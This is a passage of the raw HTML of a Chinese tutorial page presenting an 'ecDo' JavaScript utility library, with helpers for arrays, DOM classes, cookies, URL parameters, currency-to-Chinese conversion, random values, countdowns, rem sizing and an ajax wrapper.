class=\"hljs-string\">'的都删除\n//ecDo.removeArrayForValue(['</span><span class=\"hljs-built_in\">test</span><span class=\"hljs-string\">','</span><span class=\"hljs-built_in\">test</span>1<span class=\"hljs-string\">','</span><span class=\"hljs-built_in\">test</span>2<span class=\"hljs-string\">','</span><span class=\"hljs-built_in\">test</span><span class=\"hljs-string\">','</span>aaa<span class=\"hljs-string\">'],'</span><span class=\"hljs-built_in\">test</span><span class=\"hljs-string\">')\n//result：[\"test1\", \"test2\", \"aaa\"]  //数组元素的值全等于'</span><span class=\"hljs-built_in\">test</span><span class=\"hljs-string\">'才被删除\nremoveArrayForValue: function (arr, val, type) {\n    return arr.filter(function (item) {\n        return type ? item.indexOf(val) === -1 : item !== val\n    })\n}\n</span></code></pre>\n<h3 data-id=\"heading-25\">3-10 获取对象数组某些项</h3>\n<pre class=\"hljs bash\"><code>//var arr=[{a:1,b:2,c:9},{a:2,b:3,c:5},{a:5,b:9},{a:4,b:2,c:5},{a:4,b:5,c:7}]\n//ecDo.getOptionArray(arr,<span class=\"hljs-string\">'a,c'</span>)\n//result：[{a:1,c:9},{a:2,c:5},{a:5,c:underfind},{a:4,c:5},{a:4,c:7}]\n//ecDo.getOptionArray(arr,<span class=\"hljs-string\">'b'</span>)\n//result：[2, 3, 9, 2, 5]\ngetOptionArray: <span class=\"hljs-keyword\">function</span> (arr, keys) {\n    var newArr = []\n    <span class=\"hljs-keyword\">if</span> (!keys) {\n        <span class=\"hljs-built_in\">return</span> arr\n    }\n    var _keys = keys.split(<span class=\"hljs-string\">','</span>), newArrOne = {};\n    //是否只是需要获取某一项的值\n    <span class=\"hljs-keyword\">if</span> (_keys.length === 1) {\n        <span class=\"hljs-keyword\">for</span> (var i = 0, len = arr.length; i &lt; len; i++) {\n            newArr.push(arr[i][keys])\n        }\n        <span class=\"hljs-built_in\">return</span> newArr;\n    }\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = arr.length; i &lt; len; i++) {\n        newArrOne = {};\n        <span class=\"hljs-keyword\">for</span> (var j = 0, len1 = _keys.length; j &lt; len1; j++) {\n            newArrOne[_keys[j]] = arr[i][_keys[j]]\n        }\n        newArr.push(newArrOne);\n    }\n    <span class=\"hljs-built_in\">return</span> newArr\n}\n</code></pre>\n<h3 data-id=\"heading-26\">3-11 排除对象数组某些项&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//var arr=[{a:1,b:2,c:9},{a:2,b:3,c:5},{a:5,b:9},{a:4,b:2,c:5},{a:4,b:5,c:7}]\n//ecDo.filterOptionArray(arr,<span class=\"hljs-string\">'a'</span>)\n//result：[{b:2,c:9},{b:3,c:5},{b:9},{b:2,c:5},{b:5,c:7}]\n//ecDo.filterOptionArray(arr,<span class=\"hljs-string\">'a,c'</span>)\n//result：[{b:2},{b:3},{b:9},{b:2},{b:5}]\nfilterOptionArray: <span class=\"hljs-keyword\">function</span> (arr, keys) {\n    var newArr = []\n    var _keys = keys.split(<span class=\"hljs-string\">','</span>), newArrOne = {};\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = arr.length; i &lt; len; i++) {\n        newArrOne = {};\n        <span class=\"hljs-keyword\">for</span> (var key <span class=\"hljs-keyword\">in</span> arr[i]) {\n            //如果key不存在排除keys里面,添加数据\n            <span class=\"hljs-keyword\">if</span> (_keys.indexOf(key) === -1) {\n                newArrOne[key] = arr[i][key];\n            }\n        }\n        newArr.push(newArrOne);\n    }\n    <span class=\"hljs-built_in\">return</span> newArr\n}\n</code></pre>\n<h3 data-id=\"heading-27\">3-12 对象数组排序</h3>\n<pre class=\"hljs bash\"><code>//var arr=[{a:1,b:2,c:9},{a:2,b:3,c:5},{a:5,b:9},{a:4,b:2,c:5},{a:4,b:5,c:7}]\n//ecDo.arraySort(arr,<span class=\"hljs-string\">'a,b'</span>)a是第一排序条件，b是第二排序条件\n//result：[{<span class=\"hljs-string\">\"a\"</span>:1,<span class=\"hljs-string\">\"b\"</span>:2,<span class=\"hljs-string\">\"c\"</span>:9},{<span class=\"hljs-string\">\"a\"</span>:2,<span class=\"hljs-string\">\"b\"</span>:3,<span class=\"hljs-string\">\"c\"</span>:5},{<span class=\"hljs-string\">\"a\"</span>:4,<span class=\"hljs-string\">\"b\"</span>:2,<span class=\"hljs-string\">\"c\"</span>:5},{<span class=\"hljs-string\">\"a\"</span>:4,<span class=\"hljs-string\">\"b\"</span>:5,<span class=\"hljs-string\">\"c\"</span>:7},{<span class=\"hljs-string\">\"a\"</span>:5,<span class=\"hljs-string\">\"b\"</span>:9}]\narraySort: <span class=\"hljs-keyword\">function</span> (arr, sortText) {\n    <span class=\"hljs-keyword\">if</span> (!sortText) {\n        <span class=\"hljs-built_in\">return</span> arr\n    }\n    var _sortText = sortText.split(<span class=\"hljs-string\">','</span>).reverse(), _arr = arr.slice(0);\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = _sortText.length; i &lt; len; i++) {\n        _arr.sort(<span class=\"hljs-keyword\">function</span> (n1, n2) {\n            <span class=\"hljs-built_in\">return</span> n1[_sortText[i]] - n2[_sortText[i]]\n        })\n    }\n    <span class=\"hljs-built_in\">return</span> _arr;\n}\n</code></pre>\n<h3 data-id=\"heading-28\">3-13 数组扁平化</h3>\n<pre class=\"hljs bash\"><code>//ecDo.steamroller([1,2,[4,5,[1,23]]])\n//[1, 2, 4, 5, 1, 23]\nsteamroller: <span class=\"hljs-keyword\">function</span> (arr) {\n    var newArr = [],_this=this;\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; arr.length; i++) {\n        <span class=\"hljs-keyword\">if</span> (Array.isArray(arr[i])) {\n            // 如果是数组，调用(递归)steamroller 将其扁平化\n            // 然后再 push 到 newArr 中\n            newArr.push.apply(newArr, _this.steamroller(arr[i]));\n        } <span class=\"hljs-keyword\">else</span> {\n            // 不是数组直接 push 到 newArr 中\n            newArr.push(arr[i]);\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> newArr;\n}\n</code></pre>\n<h2 data-id=\"heading-29\">4.基础DOM操作</h2>\n<p>这个部分代码其实参考jquery的一些函数写法，唯一区别就是调用不用，参数一样.<br>比如下面的栗子</p>\n<pre class=\"hljs bash\"><code>//设置对象内容\njquery：$(<span class=\"hljs-string\">'#xxx'</span>).html(<span class=\"hljs-string\">'hello world'</span>);\n现在：ecDo.html(document.getElementById(<span class=\"hljs-string\">'xxx'</span>),<span class=\"hljs-string\">'hello world'</span>)\n//获取对象内容\njquery：$(<span class=\"hljs-string\">'#xxx'</span>).html();\n现在：ecDo.html(document.getElementById(<span class=\"hljs-string\">'xxx'</span>))\n</code></pre>\n<h3 data-id=\"heading-30\">4-1检测对象是否有哪个类名</h3>\n<pre class=\"hljs bash\"><code>//检测对象是否有哪个类名\nhasClass: <span class=\"hljs-keyword\">function</span> (obj, classStr) {\n    <span class=\"hljs-keyword\">if</span> (obj.className &amp;&amp; this.trim(obj.className, 1) !== <span class=\"hljs-string\">\"\"</span>) {\n        var arr = obj.className.split(/\\s+/); //这个正则表达式是因为class可以有多个,判断是否包含\n        <span class=\"hljs-built_in\">return</span> (arr.indexOf(classStr) == -1) ? <span class=\"hljs-literal\">false</span> : <span class=\"hljs-literal\">true</span>;\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-31\">4-2 添加类名</h3>\n<pre class=\"hljs bash\"><code>addClass: <span class=\"hljs-keyword\">function</span> (obj, classStr) {\n    <span class=\"hljs-keyword\">if</span> ((this.istype(obj, <span class=\"hljs-string\">'array'</span>) || this.istype(obj, <span class=\"hljs-string\">'elements'</span>)) &amp;&amp; obj.length &gt;= 1) {\n        <span class=\"hljs-keyword\">for</span> (var i = 0, len = obj.length; i &lt; len; i++) {\n            <span class=\"hljs-keyword\">if</span> (!this.hasClass(obj[i], classStr)) {\n                obj[i].className += <span class=\"hljs-string\">\" \"</span> + classStr;\n            }\n        }\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">if</span> (!this.hasClass(obj, classStr)) {\n            obj.className += <span class=\"hljs-string\">\" \"</span> + classStr;\n        }\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-32\">4-3删除类名</h3>\n<pre class=\"hljs bash\"><code>removeClass: <span class=\"hljs-keyword\">function</span> (obj, classStr) {\n    <span class=\"hljs-keyword\">if</span> ((this.istype(obj, <span class=\"hljs-string\">'array'</span>) || this.istype(obj, <span class=\"hljs-string\">'elements'</span>)) &amp;&amp; obj.length &gt; 1) {\n        <span class=\"hljs-keyword\">for</span> (var i = 0, len = obj.length; i &lt; len; i++) {\n            <span class=\"hljs-keyword\">if</span> (this.hasClass(obj[i], classStr)) {\n                var reg = new RegExp(<span class=\"hljs-string\">'(\\\\s|^)'</span> + classStr + <span class=\"hljs-string\">'(\\\\s|$)'</span>);\n                obj[i].className = obj[i].className.replace(reg, <span class=\"hljs-string\">''</span>);\n            }\n        }\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">if</span> (this.hasClass(obj, classStr)) {\n            var reg = new RegExp(<span class=\"hljs-string\">'(\\\\s|^)'</span> + classStr + <span class=\"hljs-string\">'(\\\\s|$)'</span>);\n            obj.className = obj.className.replace(reg, <span class=\"hljs-string\">''</span>);\n        }\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-33\">4-4替换类名(\"被替换的类名\",\"替换的类名\")</h3>\n<pre class=\"hljs bash\"><code>replaceClass: <span class=\"hljs-keyword\">function</span> (obj, newName, oldName) {\n    this.removeClass(obj, oldName);\n    this.addClass(obj, newName);\n}\n</code></pre>\n<h3 data-id=\"heading-34\">4-5获取兄弟节点</h3>\n<pre class=\"hljs bash\"><code>//ecDo.siblings(obj,<span class=\"hljs-string\">'#id'</span>)\nsiblings: <span class=\"hljs-keyword\">function</span> (obj, opt) {\n    var a = []; //定义一个数组，用来存o的兄弟元素\n    var p = obj.previousSibling;\n    <span class=\"hljs-keyword\">while</span> (p) { //先取o的哥哥们 判断有没有上一个哥哥元素，如果有则往下执行 p表示previousSibling\n        <span class=\"hljs-keyword\">if</span> (p.nodeType === 1) {\n            a.push(p);\n        }\n        p = p.previousSibling //最后把上一个节点赋给p\n    }\n    a.reverse() //把顺序反转一下 这样元素的顺序就是按先后的了\n    var n = obj.nextSibling; //再取o的弟弟\n    <span class=\"hljs-keyword\">while</span> (n) { //判断有没有下一个弟弟结点 n是nextSibling的意思\n        <span class=\"hljs-keyword\">if</span> (n.nodeType === 1) {\n            a.push(n);\n        }\n        n = n.nextSibling;\n    }\n    <span class=\"hljs-keyword\">if</span> (opt) {\n        var _opt = opt.substr(1);\n        var b = [];//定义一个数组，用于储存过滤a的数组\n        <span class=\"hljs-keyword\">if</span> (opt[0] === <span class=\"hljs-string\">'.'</span>) {\n            b = a.filter(<span class=\"hljs-keyword\">function</span> (item) {\n                <span class=\"hljs-built_in\">return</span> item.className === _opt\n            });\n        }\n        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (opt[0] === <span class=\"hljs-string\">'#'</span>) {\n            b = a.filter(<span class=\"hljs-keyword\">function</span> (item) {\n                <span class=\"hljs-built_in\">return</span> item.id === _opt\n            });\n        }\n        <span class=\"hljs-keyword\">else</span> {\n            b = a.filter(<span class=\"hljs-keyword\">function</span> (item) {\n                <span class=\"hljs-built_in\">return</span> item.tagName.toLowerCase() === opt\n            });\n        }\n        <span class=\"hljs-built_in\">return</span> b;\n    }\n    <span class=\"hljs-built_in\">return</span> a;\n}\n</code></pre>\n<h3 data-id=\"heading-35\">4-6设置样式</h3>\n<pre class=\"hljs bash\"><code>css: <span class=\"hljs-keyword\">function</span> (obj, json) {\n    <span class=\"hljs-keyword\">for</span> (var attr <span class=\"hljs-keyword\">in</span> json) {\n        obj.style[attr] = json[attr];\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-36\">4-7设置文本内容</h3>\n<pre class=\"hljs bash\"><code>html: <span class=\"hljs-keyword\">function</span> (obj) {\n    <span class=\"hljs-keyword\">if</span> (arguments.length === 1) {\n        <span class=\"hljs-built_in\">return</span> obj.innerHTML;\n    } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (arguments.length === 2) {\n        obj.innerHTML = arguments[1];\n    }\n}\ntext: <span class=\"hljs-keyword\">function</span> (obj) {\n    <span class=\"hljs-keyword\">if</span> (arguments.length === 1) {\n        <span class=\"hljs-built_in\">return</span> obj.innerHTML;\n    } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (arguments.length === 2) {\n        obj.innerHTML = this.filterStr(arguments[1],<span class=\"hljs-string\">'html'</span>);\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-37\">4-8显示隐藏</h3>\n<pre class=\"hljs bash\"><code>show: <span class=\"hljs-keyword\">function</span> (obj) {\n    var blockArr=[<span class=\"hljs-string\">'div'</span>,<span class=\"hljs-string\">'li'</span>,<span class=\"hljs-string\">'ul'</span>,<span class=\"hljs-string\">'ol'</span>,<span class=\"hljs-string\">'dl'</span>,<span class=\"hljs-string\">'table'</span>,<span class=\"hljs-string\">'article'</span>,<span class=\"hljs-string\">'h1'</span>,<span class=\"hljs-string\">'h2'</span>,<span class=\"hljs-string\">'h3'</span>,<span class=\"hljs-string\">'h4'</span>,<span class=\"hljs-string\">'h5'</span>,<span class=\"hljs-string\">'h6'</span>,<span class=\"hljs-string\">'p'</span>,<span class=\"hljs-string\">'hr'</span>,<span class=\"hljs-string\">'header'</span>,<span class=\"hljs-string\">'footer'</span>,<span class=\"hljs-string\">'details'</span>,<span class=\"hljs-string\">'summary'</span>,<span class=\"hljs-string\">'section'</span>,<span class=\"hljs-string\">'aside'</span>,<span class=\"hljs-string\">''</span>]\n    <span class=\"hljs-keyword\">if</span>(blockArr.indexOf(obj.tagName.toLocaleLowerCase())===-1){\n        obj.style.display =<span class=\"hljs-string\">'inline'</span>;\n    }\n    <span class=\"hljs-keyword\">else</span>{\n        obj.style.display =<span class=\"hljs-string\">'block'</span>;\n    }\n},\nhide: <span class=\"hljs-keyword\">function</span> (obj) {\n    obj.style.display = <span class=\"hljs-string\">\"none\"</span>;\n}\n</code></pre>\n<h2 data-id=\"heading-38\">5.其他操作</h2>\n<h3 data-id=\"heading-39\">5-1cookie</h3>\n<pre class=\"hljs bash\"><code>//cookie\n//设置cookie\n<span class=\"hljs-built_in\">set</span>Cookie: <span class=\"hljs-keyword\">function</span> (name, value, iDay) {\n    var oDate = new Date();\n    oDate.setDate(oDate.getDate() + iDay);\n    document.cookie = name + <span class=\"hljs-string\">'='</span> + value + <span class=\"hljs-string\">';expires='</span> + oDate;\n},\n//获取cookie\ngetCookie: <span class=\"hljs-keyword\">function</span> (name) {\n    var arr = document.cookie.split(<span class=\"hljs-string\">'; '</span>);\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; arr.length; i++) {\n        var arr2 = arr[i].split(<span class=\"hljs-string\">'='</span>);\n        <span class=\"hljs-keyword\">if</span> (arr2[0] == name) {\n            <span class=\"hljs-built_in\">return</span> arr2[1];\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">''</span>;\n},\n//删除cookie\nremoveCookie: <span class=\"hljs-keyword\">function</span> (name) {\n    this.setCookie(name, 1, -1);\n},\n</code></pre>\n<h3 data-id=\"heading-40\">5-2清除对象中值为空的属性</h3>\n<pre class=\"hljs bash\"><code>//ecDo.filterParams({a:<span class=\"hljs-string\">\"\"</span>,b:null,c:<span class=\"hljs-string\">\"010\"</span>,d:123})\n//Object {c: <span class=\"hljs-string\">\"010\"</span>, d: 123}\nfilterParams: <span class=\"hljs-keyword\">function</span> (obj) {\n    var _newPar = {};\n    <span class=\"hljs-keyword\">for</span> (var key <span class=\"hljs-keyword\">in</span> obj) {\n        <span class=\"hljs-keyword\">if</span> ((obj[key] === 0 ||obj[key] === <span class=\"hljs-literal\">false</span>|| obj[key]) &amp;&amp; obj[key].toString().replace(/(^\\s*)|(\\s*$)/g, <span class=\"hljs-string\">''</span>) !== <span class=\"hljs-string\">''</span>) {\n            _newPar[key] = obj[key];\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> _newPar;\n}\n</code></pre>\n<h3 data-id=\"heading-41\">5-3现金额大写转换函数</h3>\n<pre class=\"hljs bash\"><code>//ecDo.upDigit(168752632)\n//result：<span class=\"hljs-string\">\"人民币壹亿陆仟捌佰柒拾伍万贰仟陆佰叁拾贰元整\"</span>\n//ecDo.upDigit(1682)\n//result：<span class=\"hljs-string\">\"人民币壹仟陆佰捌拾贰元整\"</span>\n//ecDo.upDigit(-1693)\n//result：<span class=\"hljs-string\">\"欠人民币壹仟陆佰玖拾叁元整\"</span>\nupDigit: <span class=\"hljs-keyword\">function</span> (n) {\n    var fraction = [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'厘'</span>];\n    var digit = [<span class=\"hljs-string\">'零'</span>, <span class=\"hljs-string\">'壹'</span>, <span class=\"hljs-string\">'贰'</span>, <span class=\"hljs-string\">'叁'</span>, <span class=\"hljs-string\">'肆'</span>, <span class=\"hljs-string\">'伍'</span>, <span class=\"hljs-string\">'陆'</span>, <span class=\"hljs-string\">'柒'</span>, <span class=\"hljs-string\">'捌'</span>, <span class=\"hljs-string\">'玖'</span>];\n    var unit = [\n        [<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'万'</span>, <span class=\"hljs-string\">'亿'</span>],\n        [<span class=\"hljs-string\">''</span>, <span class=\"hljs-string\">'拾'</span>, <span class=\"hljs-string\">'佰'</span>, <span class=\"hljs-string\">'仟'</span>]\n    ];\n    var head = n &lt; 0 ? <span class=\"hljs-string\">'欠人民币'</span> : <span class=\"hljs-string\">'人民币'</span>;\n    n = Math.abs(n);\n    var s = <span class=\"hljs-string\">''</span>;\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; fraction.length; i++) {\n        s += (digit[Math.floor(n * 10 * Math.pow(10, i)) % 10] + fraction[i]).replace(/零./, <span class=\"hljs-string\">''</span>);\n    }\n    s = s || <span class=\"hljs-string\">'整'</span>;\n    n = Math.floor(n);\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; unit[0].length &amp;&amp; n &gt; 0; i++) {\n        var p = <span class=\"hljs-string\">''</span>;\n        <span class=\"hljs-keyword\">for</span> (var j = 0; j &lt; unit[1].length &amp;&amp; n &gt; 0; j++) {\n            p = digit[n % 10] + unit[1][j] + p;\n            n = Math.floor(n / 10);\n        }\n        s = p.replace(/(零.)*零$/, <span class=\"hljs-string\">''</span>).replace(/^$/, <span class=\"hljs-string\">'零'</span>) + unit[0][i] + s;\n        //s = p + unit[0][i] + s;\n    }\n    <span class=\"hljs-built_in\">return</span> head + s.replace(/(零.)*零元/, <span class=\"hljs-string\">'元'</span>).replace(/(零.)+/g, <span class=\"hljs-string\">'零'</span>).replace(/^整$/, <span class=\"hljs-string\">'零元整'</span>);\n} \n</code></pre>\n<h3 data-id=\"heading-42\">5-4获取，设置url参数</h3>\n<pre class=\"hljs bash\"><code>//设置url参数\n//ecDo.setUrlPrmt({<span class=\"hljs-string\">'a'</span>:1,<span class=\"hljs-string\">'b'</span>:2})\n//result：a=1&amp;b=2\n<span class=\"hljs-built_in\">set</span>UrlPrmt: <span class=\"hljs-keyword\">function</span> (obj) {\n    var _rs = [];\n    <span class=\"hljs-keyword\">for</span> (var p <span class=\"hljs-keyword\">in</span> obj) {\n        <span class=\"hljs-keyword\">if</span> (obj[p] != null &amp;&amp; obj[p] != <span class=\"hljs-string\">''</span>) {\n            _rs.push(p + <span class=\"hljs-string\">'='</span> + obj[p])\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> _rs.join(<span class=\"hljs-string\">'&amp;'</span>);\n},\n//获取url参数\n//ecDo.getUrlPrmt(<span class=\"hljs-string\">'test.com/write?draftId=122000011938'</span>)\n//result：Object{draftId: <span class=\"hljs-string\">\"122000011938\"</span>}\ngetUrlPrmt: <span class=\"hljs-keyword\">function</span> (url) {\n    url = url ? url : window.location.href;\n    var _pa = url.substring(url.indexOf(<span class=\"hljs-string\">'?'</span>) + 1),\n        _arrS = _pa.split(<span class=\"hljs-string\">'&amp;'</span>),\n        _rs = {};\n    <span class=\"hljs-keyword\">for</span> (var i = 0, _len = _arrS.length; i &lt; _len; i++) {\n        var pos = _arrS[i].indexOf(<span class=\"hljs-string\">'='</span>);\n        <span class=\"hljs-keyword\">if</span> (pos == -1) {\n            <span class=\"hljs-built_in\">continue</span>;\n        }\n        var name = _arrS[i].substring(0, pos),\n            value = window.decodeURIComponent(_arrS[i].substring(pos + 1));\n        _rs[name] = value;\n    }\n    <span class=\"hljs-built_in\">return</span> _rs;\n}\n</code></pre>\n<h3 data-id=\"heading-43\">5-5随机返回一个范围的数字</h3>\n<pre class=\"hljs bash\"><code>//ecDo.randomNumber(5,10)\n//返回5-10的随机整数，包括5，10\n//ecDo.randomNumber(10)\n//返回0-10的随机整数，包括0，10\n//ecDo.randomNumber()\n//返回0-255的随机整数，包括0，255\nrandomNumber: <span class=\"hljs-keyword\">function</span> (n1, n2) {\n    <span class=\"hljs-keyword\">if</span> (arguments.length === 2) {\n        <span class=\"hljs-built_in\">return</span> Math.round(n1 + Math.random() * (n2 - n1));\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (arguments.length === 1) {\n        <span class=\"hljs-built_in\">return</span> Math.round(Math.random() * n1)\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-built_in\">return</span> Math.round(Math.random() * 255)\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-44\">5-6随进产生颜色</h3>\n<pre class=\"hljs bash\"><code>randomColor: <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n    //randomNumber是下面定义的函数\n    //写法1\n    //<span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'rgb('</span> + this.randomNumber(255) + <span class=\"hljs-string\">','</span> + this.randomNumber(255) + <span class=\"hljs-string\">','</span> + this.randomNumber(255) + <span class=\"hljs-string\">')'</span>;\n    //写法2\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'#'</span> + Math.random().toString(16).substring(2).substr(0, 6);\n    //写法3\n    //var color=<span class=\"hljs-string\">'#'</span>,_index=this.randomNumber(15);\n    //<span class=\"hljs-keyword\">for</span>(var i=0;i&lt;6;i++){\n    //color+=<span class=\"hljs-string\">'0123456789abcdef'</span>[_index];\n    //}\n    //<span class=\"hljs-built_in\">return</span> color;\n}\n//这种写法，偶尔会有问题。大家得注意哦\n//Math.floor(Math.random()*0xffffff).toString(16);\n</code></pre>\n<p><img alt=\"clipboard.png\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/8/16031bc0d8a33cb2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"549\" data-height=\"216\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;549&quot; height=&quot;216&quot;&gt;&lt;/svg&gt;\"></p>\n<h3 data-id=\"heading-45\">5-7Date日期时间部分</h3>\n<pre class=\"hljs bash\"><code>//到某一个时间的倒计时\n//ecDo.getEndTime(<span class=\"hljs-string\">'2017/7/22 16:0:0'</span>)\n//result：<span class=\"hljs-string\">\"剩余时间6天 2小时 28 分钟20 秒\"</span>\ngetEndTime: <span class=\"hljs-keyword\">function</span> (endTime) {\n    var startDate = new Date(); //开始时间，当前时间\n    var endDate = new Date(endTime); //结束时间，需传入时间参数\n    var t = endDate.getTime() - startDate.getTime(); //时间差的毫秒数\n    var d = 0,\n        h = 0,\n        m = 0,\n        s = 0;\n    <span class=\"hljs-keyword\">if</span> (t &gt;= 0) {\n        d = Math.floor(t / 1000 / 3600 / 24);\n        h = Math.floor(t / 1000 / 60 / 60 % 24);\n        m = Math.floor(t / 1000 / 60 % 60);\n        s = Math.floor(t / 1000 % 60);\n    }\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">\"剩余时间\"</span> + d + <span class=\"hljs-string\">\"天 \"</span> + h + <span class=\"hljs-string\">\"小时 \"</span> + m + <span class=\"hljs-string\">\" 分钟\"</span> + s + <span class=\"hljs-string\">\" 秒\"</span>;\n}\n</code></pre>\n<h3 data-id=\"heading-46\">5-8适配rem</h3>\n<p>这个适配的方法很多，我就写我自己用的方法。大家也可以去我回答过得一个问题那里看更详细的说明！<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fq%2F1010000010179208%2Fa-1020000010179558\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">移动端适配问题</a></p>\n<pre class=\"hljs bash\"><code>getFontSize: <span class=\"hljs-keyword\">function</span> (_client) {\n    var doc = document,\n        win = window;\n    var docEl = doc.documentElement,\n        resizeEvt = <span class=\"hljs-string\">'orientationchange'</span> <span class=\"hljs-keyword\">in</span> window ? <span class=\"hljs-string\">'orientationchange'</span> : <span class=\"hljs-string\">'resize'</span>,\n        recalc = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            var clientWidth = docEl.clientWidth;\n            <span class=\"hljs-keyword\">if</span> (!clientWidth) <span class=\"hljs-built_in\">return</span>;\n            //如果屏幕大于750（750是根据我效果图设置的，具体数值参考效果图），就设置clientWidth=750，防止font-size会超过100px\n            <span class=\"hljs-keyword\">if</span> (clientWidth &gt; _client) {\n                clientWidth = _client\n            }\n            //设置根元素font-size大小\n            docEl.style.fontSize = 100 * (clientWidth / _client) + <span class=\"hljs-string\">'px'</span>;\n        };\n    //屏幕大小改变，或者横竖屏切换时，触发函数\n    win.addEventListener(resizeEvt, recalc, <span class=\"hljs-literal\">false</span>);\n    //文档加载完成时，触发函数\n    doc.addEventListener(<span class=\"hljs-string\">'DOMContentLoaded'</span>, recalc, <span class=\"hljs-literal\">false</span>);\n}\n//ecDo.getFontSize(750)\n//使用方式很简单，比如效果图上，有张图片。宽高都是100px;\n//750是设计图的宽度\n//样式写法就是\nimg{\n    width:1rem;\n    height:1rem;\n}\n//这样的设置，比如在屏幕宽度大于等于750px设备上，1rem=100px；图片显示就是宽高都是100px\n//比如在iphone6(屏幕宽度：375)上，375/750*100=50px;就是1rem=50px;图片显示就是宽高都是50px;\n</code></pre>\n<h3 data-id=\"heading-47\">5-9ajax</h3>\n<pre class=\"hljs bash\"><code>/* 封装ajax函数\n * @param {string}obj.type http连接的方式，包括POST和GET两种方式\n * @param {string}obj.url 发送请求的url\n * @param {boolean}obj.async 是否为异步请求，<span class=\"hljs-literal\">true</span>为异步的，<span class=\"hljs-literal\">false</span>为同步的\n * @param {object}obj.data 发送的参数，格式为对象类型\n * @param {<span class=\"hljs-keyword\">function</span>}obj.success ajax发送并接收成功调用的回调函数\n * @param {<span class=\"hljs-keyword\">function</span>}obj.error ajax发送失败或者接收失败调用的回调函数\n */\n//  ecDo.ajax({\n//      <span class=\"hljs-built_in\">type</span>:<span class=\"hljs-string\">'get'</span>,\n//      url:<span class=\"hljs-string\">'xxx'</span>,\n//      data:{\n//          id:<span class=\"hljs-string\">'111'</span>\n//      },\n//      success:<span class=\"hljs-keyword\">function</span>(res){\n//          console.log(res)\n//      }\n//  })\najax: <span class=\"hljs-keyword\">function</span> (obj) {\n    obj = obj || {};\n    obj.type = obj.type.toUpperCase() || <span class=\"hljs-string\">'POST'</span>;\n    obj.url = obj.url || <span class=\"hljs-string\">''</span>;\n    obj.async = obj.async || <span class=\"hljs-literal\">true</span>;\n    obj.data = obj.data || null;\n    obj.success = obj.success || <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        };\n    obj.error = obj.error || <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        };\n    var xmlHttp = null;\n    <span class=\"hljs-keyword\">if</span> (XMLHttpRequest) {\n        xmlHttp = new XMLHttpRequest();\n    } <span class=\"hljs-keyword\">else</span> {\n        xmlHttp = new ActiveXObject(<span class=\"hljs-string\">'Microsoft.XMLHTTP'</span>);\n    }\n    var params = [];\n    <span class=\"hljs-keyword\">for</span> (var key <span class=\"hljs-keyword\">in</span> obj.data) {\n        params.push(key + <span class=\"hljs-string\">'='</span> + obj.data[key]);\n    }\n    var postData = params.join(<span class=\"hljs-string\">'&amp;'</span>);\n    <span class=\"hljs-keyword\">if</span> (obj.type.toUpperCase() === <span class=\"hljs-string\">'POST'</span>) {\n        xmlHttp.open(obj.type, obj.url, obj.async);\n        xmlHttp.setRequestHeader(<span class=\"hljs-string\">'Content-Type'</span>, <span class=\"hljs-string\">'application/x-www-form-urlencoded;charset=utf-8'</span>);\n        xmlHttp.send(postData);\n    } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (obj.type.toUpperCase() === <span class=\"hljs-string\">'GET'</span>) {\n        xmlHttp.open(obj.type, obj.url + <span class=\"hljs-string\">'?'</span> + postData, obj.async);\n        xmlHttp.send(null);\n    }\n    xmlHttp.onreadystatechange = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        <span class=\"hljs-keyword\">if</span> (xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) {\n            obj.success(xmlHttp.responseText);\n        } <span class=\"hljs-keyword\">else</span> {\n            obj.error(xmlHttp.responseText);\n        }\n    };\n}\n</code></pre>\n<h3 data-id=\"heading-48\">5-10图片懒加载&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//图片没加载出来时用一张图片代替\naftLoadImg: <span 